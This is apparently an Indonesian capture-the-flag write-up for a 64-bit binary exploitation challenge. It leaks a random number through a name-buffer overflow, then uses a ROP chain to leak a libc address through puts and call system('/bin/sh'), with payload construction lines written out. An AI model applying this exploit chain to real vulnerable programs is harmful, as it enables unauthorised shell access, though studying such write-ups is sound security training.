Diberikan suatu file binary. Fungsi main setelah di decompile : 
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  unsigned int v3; // eax@1
  char v5; // [sp+0h] [bp-70h]@4
  int v6; // [sp+4Ch] [bp-24h]@1
  char buf; // [sp+50h] [bp-20h]@1
  int v8; // [sp+6Ch] [bp-4h]@1

  setvbuf(stdout, 0LL, 2, 0LL);
  v3 = time(0LL);
  srand(v3);
  v8 = rand() % 65535;
  printf("Masukkan nama: ", 0LL);
  fflush(stdout);
  read(0, &buf, 0x1CuLL);
  printf("Selamat datang %s\n", &buf);
  printf("Untuk mendapatkan hadiah silahkan tebak sebuah angka: ");
  fflush(stdout);
  __isoc99_scanf("%d", &v6);
  getchar();
  if ( v8 != v6 )
  {
    puts("bye");
    fflush(stdout);
    exit(0);
  }
  printf("Masukkan hadiah yang kamu inginkan: ");
  read(0, &v5, 300uLL);
  return 0LL;
}
```

Terdapat 3 input : nama, angka, dan hadiah.
1. variable nama vulnerable terhadap buffer overflow.
2. variable angka meminta input yang menebak suatu angka random yang di modulo 65535, berarti ukuran angkanya 2 byte (65536 = 2^16)
3. variable hadiah juga vulnerable terhadap buffer overflow, setelah input variable tersebut fungsi main exit. Kita dapat melakukan
   teknik exploit ROP untuk leak libc dan memanggil system('/bin/sh')

STEP ONE:
Untuk menebak angka random, kita dapat melakukan leak terhadap variable tersebut dengan memanfaatkan vulnerability buffer overflow
pada input nama. Ketika program mencetak string, program tersebut akan membaca seluruh byte dari register hingga menemukan newline.
Jika kita menimpa seluruh byte sampai tepat sebelum variable angka random, maka fungsi print akan mencetak nilai variable random
tersebut. 
```
CONTOH PRINT NORMAL:
41414141000000AEFF000000
ketika di print maka akan keluar huruf 'A'*4
KASUS OVERFLOW:
4141414141414169FF000000
ketika di print maka akan keluar 'AAAAAAA\xAE\xFF' karena fungsi print akan mencetak hingga byte NULL ditemukan.
```

STEP TWO:
Setelah "menebak" angka random, kita dapat memilih hadiah. Hadiah yang dipilih berupa inputan string yang jaraknya ke EBP adalah 
0x70 byte atau 112byte. Karena 64bit maka kita tambahkan 8 byte lagi agar overwrite EBP. 
```
payload = 'A'*120
```
Setelah payload bufferoverflow, kita kemudian menambahkan payload untuk me-leak address suatu fungsi, misalnya puts. Dengan
menggunakan IDA kita dapat mendapatkan got dari fungsi puts, yang merupakan pointer ke alamat fungsi puts pada libc. Kemudian
untuk mendapatkan alamat libc nya, kita dapat mengurangi alamat fungsi puts dengan offset puts yang bisa didapatkan dari libc
database (dalam kasus ini, diberikan dari soalnya).
Berbeda dengan arsitektur 32bit, dalam arsitektur 64bit argumen yang digunakan fungsi yang dipanggil tidak diletakan di stack 
melainkan di register. Urutan register yang digunakan sebagai berikut : rdi, rsi, rdx.
Kita bisa mendapatkan alamat fungsi pop rdi dengan tools ROPGadget.
Alamat-alamat yang dibutuhkan:
  - alamat pop rdi
  - alamat got puts
  - alamat call puts
  - alamat main untuk kembali ke main setelah mendapatkan leak
```
payload = 'A'*120 + pop_rdi + puts_got + puts_call + main_address
```
Setelah mengirim payload kita akan mencetak alamat puts -- yang ditunjuk oleh got puts -- melalui pemanggilan fungsi puts.
Alamat didapat : puts address
Kemudian kita bisa menghitung alamat lainnya yang dibutuhkan untuk pemanggilan system('/bin/sh/')
Jangan lupa dalam operasi aritmetika kita tidak dapat menggunakan bentuk p64(), jika sebelumnya variable-variable disimpan dalam
bentuk pack maka harus diunpack terlebih dahulu menjadi integer.
libc_base = puts_addres - puts_offset (offset didapat dari libc database)
system_address = libc_base + system_offset
binsh_address = libc_base + binsh_offset

Setelah didapatkan alamat system dan binsh, kita sudah kembali lagi ke fungsi main. Ulangi proses bufferoverlow sebelumnya, 
payload terakhir ganti menjadi :
```
payload = 'A'*120 + pop_rdi + p64(binsh_address) + p64(system_address)

perhatikan bahwa binsh_address di pack terlebih dahulu karena sebelumnya dalam bentuk integer.
```

Sekarang kita telah memanggil system('/bin/sh') dan dapat melakukan perintah-perintah jahat sesuka kita >:D.





